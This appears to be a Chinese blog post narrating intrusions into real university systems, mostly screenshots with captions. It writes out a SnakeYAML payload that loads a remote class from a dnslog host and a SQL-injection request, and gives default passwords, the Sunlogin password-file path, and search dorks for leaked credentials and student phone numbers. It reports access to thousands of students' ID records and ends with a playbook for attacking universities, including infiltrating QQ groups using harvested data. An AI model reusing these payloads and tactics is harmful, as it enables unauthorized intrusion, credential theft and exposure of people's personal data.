<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg">
        
    </a></p>
<p>可以看到页面跳转到了设置密码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg">
        
    </a></p>
<p>成功更改密码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg">
        
    </a></p>
<p>79个应用，通过其中一个aspx站SQL注入拿到shell</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg">
        
    </a></p>
<h2 id="3github泄漏账号密码" class="headerLink">
    <a href="#3github%e6%b3%84%e6%bc%8f%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>3、Github泄漏账号密码</h2><h2 id="账号密码" class="headerLink">
    <a href="#%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>账号密码</h2><p>1、GitHub搜索&quot;学校域名&quot; &ldquo;password&rdquo; 发现邮箱账号密码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg">
        
    </a></p>
<p>2、登录邮箱发现手机号身份证号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg">
        
    </a></p>
<h2 id="统一门户" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7" class="header-mark"></a>统一门户</h2><p>3、手机号加邮箱密码直接登录统一门户</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg">
        
    </a></p>
<h2 id="泛微oa" class="headerLink">
    <a href="#%e6%b3%9b%e5%be%aeoa" class="header-mark"></a>泛微OA</h2><p>跳转到泛微OA,文件上传GetShell</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg">
        
    </a></p>
<h2 id="4向日葵密码读取" class="headerLink">
    <a href="#4%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>4、向日葵密码读取</h2><h2 id="heapdump文件泄漏" class="headerLink">
    <a href="#heapdump%e6%96%87%e4%bb%b6%e6%b3%84%e6%bc%8f" class="header-mark"></a>heapdump文件泄漏</h2><p>直接下载heapdump文件</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg">
        
    </a></p>
<p>读取到mssql账号密码</p>
<h2 id="向日葵密码读取" class="headerLink">
    <a href="#%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>向日葵密码读取</h2><p>成功连接mssql服务器，执行xp_cmdshell</p>
<p>C:\Program Files\Oray\SunLogin\SunloginClient\config.ini为向日葵的默认安装配置文件，直接尝试读取</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg">
        
    </a></p>
<p>fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg">
        
    </a></p>
<p>可以使用GitHub解密项目<a href="https://github.com/wafinfo/Sunflower_get_Password" target="_blank" rel="noopener noreferrer">https://github.com/wafinfo/Sunflower_get_Password</a>进行解密。</p>
<p>解密后成功连接目标主机服务器</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg">
        
    </a></p>
<h2 id="5若依漏洞getshell" class="headerLink">
    <a href="#5%e8%8b%a5%e4%be%9d%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>5、若依漏洞GetShell</h2><p>1、某学院首页</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg">
        
    </a></p>
<p>2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg">
        
    </a></p>
<h2 id="定时任务命令执行" class="headerLink">
    <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>定时任务命令执行</h2><p>以管理员权限登录在定时任务处新增</p>
<p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&ldquo;<a href="ftp://ceshi.bdtmos.dnslog.cn" target="_blank" rel="noopener noreferrer">ftp://ceshi.bdtmos.dnslog.cn</a>&rdquo;] ]] ]&rsquo;)运行任务</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg">
        
    </a>DNSlog平台收到请求</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg">
        
    </a></p>
<h2 id="shiro-反序列化漏洞" class="headerLink">
    <a href="#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>shiro 反序列化漏洞</h2><p>工具直接开扫，成功注入内存马</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg">
        
    </a></p>
<p>连接内存马</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg">
        
    </a></p>
<p>发现历史入侵痕迹，发现fscan黑客漏扫工具</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg">
        
    </a></p>
<h2 id="sql注入" class="headerLink">
    <a href="#sql%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入</h2><p>sql注入当时也懒得去尝试，估计也是存在的</p>
<p>/system/role/list</p>
<p>/system/role/export</p>
<p>/system/dept/edit</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">system</span><span class="o">/</span><span class="nx">role</span><span class="o">/</span><span class="k">list</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="nx">Host</span><span class="o">:</span> <span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span> <span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span> <span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">84.0</span><span class="o">.</span><span class="mf">4147.105</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span> <span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">signed</span><span class="o">-</span><span class="nx">exchange</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">b3</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span> <span class="nx">same</span><span class="o">-</span><span class="nx">origin</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span> <span class="nx">navigate</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span> <span class="o">?</span><span class="mi">1</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span> <span class="nx">document</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Cookie</span><span class="o">:</span> <span class="nx">JSESSIONID</span><span class="o">=</span><span class="nx">e9f143b9</span><span class="o">-</span><span class="mi">3</span><span class="nx">c3d</span><span class="o">-</span><span class="mi">4</span><span class="nx">acb</span><span class="o">-</span><span class="mi">96</span><span class="nx">a4</span><span class="o">-</span><span class="mi">93</span><span class="nx">c7367a98e9</span> <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">75</span> <span class="nx">params</span><span class="p">[</span><span class="nx">dataScope</span><span class="p">]</span><span class="o">=</span><span class="k">and</span> <span class="nx">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="nx">select</span> <span class="nx">database</span><span class="p">()),</span><span class="mh">0x7e</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="6fckeditor上传文件getshell" class="headerLink">
    <a href="#6fckeditor%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>6、FCKeditor上传文件GetShell</h2><p>1、扫描目录发现存在FCKeditor目录</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg">
        
    </a></p>
<p>2、直接找到上传目录</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg">
        
    </a></p>
<p>3、上传aspx木马</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg">
        
    </a></p>
<p>成功连接</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg">
        
    </a></p>
<h2 id="7任意文件上传" class="headerLink">
    <a href="#7%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>7、任意文件上传</h2><p>根据学校名称及域名进行编排密码本，爆破登录admin账号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg">
        
    </a></p>
<p>上传点任意文件上传GetShell</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg">
        
    </a></p>
<h2 id="8s2反序列化漏洞getshell" class="headerLink">
    <a href="#8s2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>8、S2反序列化漏洞GetShell</h2><p>1、目标网站存在S2框架</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg">
        
    </a></p>
<p>2、直接使用工具进行扫描，进而获取权限进行内网渗透</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg">
        
    </a></p>
<h2 id="9逻辑漏洞" class="headerLink">
    <a href="#9%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" class="header-mark"></a>9、逻辑漏洞</h2><h2 id="找回密码-1" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81-1" class="header-mark"></a>找回密码</h2><p>1、某站点找回密码处，短信验证码直接出现在回包中</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg">
        
    </a></p>
<p>2、谷歌语法搜索 &ldquo;XX大学&rdquo; &ldquo;手机号&rdquo; filetype:xls 找到一些手机号码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg">
        
    </a></p>
<p>3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg">
        
    </a></p>
<p>但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg">
        
    </a></p>
<h2 id="统一门户-1" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7-1" class="header-mark"></a>统一门户</h2><p>使用学号加身份证后六位直接登录统一服务平台</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg">
        
    </a></p>
<h2 id="10geoserver弱口令" class="headerLink">
    <a href="#10geoserver%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="header-mark"></a>10、geoserver弱口令</h2><p>8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg" title="image.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg">
        
    </a></p>
<h2 id="获取数据库密码" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81" class="header-mark"></a>获取数据库密码</h2><p>登录后进入配置页面，点击查看其中的数据存储</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg">
        
    </a></p>
<p>F12查看网页源代码，读取PostgreSQL密码：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg">
        
    </a></p>
<h2 id="撞库" class="headerLink">
    <a href="#%e6%92%9e%e5%ba%93" class="header-mark"></a>撞库</h2><p>同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg">
        
    </a></p>
<p>在其中一个log表中发现了账号和MD5加密的密码。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg">
        
    </a></p>
<h2 id="getshell" class="headerLink">
    <a href="#getshell" class="header-mark"></a>GetShell</h2><p>8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg">
        
    </a></p>
<h2 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p>对于高校的渗透可以从以下几点入手</p>
<p>1、VPN弱口令，GitHub泄漏是重灾区，可以搜索&quot;学校域名&quot; &ldquo;password&rdquo;</p>
<p>2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。</p>
<p>3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。</p>
<p>4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排</p>
<p>5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中</p>
<p>总结起来就是多信息收集，信息收集yyds</p>]]></description>
</item></channel>
</rss>
